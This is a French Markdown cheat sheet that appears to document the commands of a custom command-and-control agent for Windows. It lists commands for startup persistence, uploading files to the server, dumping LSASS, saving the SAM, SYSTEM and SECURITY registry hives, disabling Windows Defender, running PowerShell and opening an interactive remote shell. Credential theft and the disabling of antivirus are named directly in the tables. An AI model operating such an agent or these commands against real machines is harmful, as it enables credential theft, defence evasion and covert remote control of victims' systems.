# Commandes C2 - Résumé

## Persistance
| Commande | Description |
|----------|-------------|
| `persistence -n "Nom" -p "C:\chemin\app.exe"` | Ajoute au démarrage Windows |
| `unpersist -n "Nom"` | Retire du démarrage |
| `check-persist` | Liste les apps au démarrage |

## Transfert de fichiers
| Commande | Description |
|----------|-------------|
| `upload C:\chemin\fichier.txt` | Envoie un fichier vers le serveur |
| `download fichier.txt C:\dest\fichier.txt` | Télécharge depuis le serveur |

## Credentials
| Commande | Description |
|----------|-------------|
| `lsass` | Dump LSASS vers C:\lsass.dmp |
| `lsass C:\Temp\dump.dmp` | Dump LSASS vers chemin spécifié |
| `sam` | Sauvegarde HKLM\SAM dans C:\sam.save |
| `system` | Sauvegarde HKLM\SYSTEM dans C:\system.save |
| `security` | Sauvegarde HKLM\SECURITY dans C:\security.save |

## Antivirus
| Commande | Description |
|----------|-------------|
| `av-off` | Désactive Windows Defender |
| `av-on` | Réactive Windows Defender |
| `av-status` | Affiche le statut de l'antivirus |

## Navigation
| Commande | Description |
|----------|-------------|
| `cd C:\chemin` | Change de répertoire |
| `cd /d D:\chemin` | Change de répertoire (autre lecteur) |

## Contrôle
| Commande | Description |
|----------|-------------|
| `check-admin` | Vérifie si l'agent tourne en admin |

## Autres
| Commande | Description |
|----------|-------------|
| `quit` | Arrête l'agent |
| `help` | Affiche l'aide |
| `powershell -c "commande"` | Lance une commande PowerShell |

## Shell Interactif
| Commande | Description |
|----------|-------------|
| `shell <prog.exe>` | Ouvre un shell interactif persistant |
| `shell_cmd <commande>` | Envoie une commande au shell interactif |
| `shell_close` | Ferme le shell interactif |

## Notes
- Les commandes Windows standard fonctionnent aussi (dir, whoami, ipconfig...)
- `lsass` nécessite des droits Administrateur
- Les fichiers uploadés vont dans `server/uploads/`
